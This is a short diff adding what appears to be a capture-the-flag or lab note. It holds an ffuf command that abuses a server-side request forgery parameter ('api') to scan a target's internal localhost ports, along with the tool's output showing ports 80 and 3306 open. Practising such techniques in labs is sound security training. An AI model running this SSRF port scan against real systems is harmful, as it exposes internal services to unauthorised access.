@@ -1,0 +1,27 @@
+ffuf -w wordlist.txt -u "http://94.237.50.128:39046" -ic -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ/?id%3DFusionExpress01" -mc all -fw 16
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://94.237.50.128:39046
+ :: Wordlist         : FUZZ: /tmp/wordlist.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : api=http://127.0.0.1:FUZZ/?id%3DFusionExpress01
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 16
+________________________________________________
+
+80                      [Status: 200, Size: 4194, Words: 278, Lines: 126, Duration: 4317ms]
+3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 86ms]
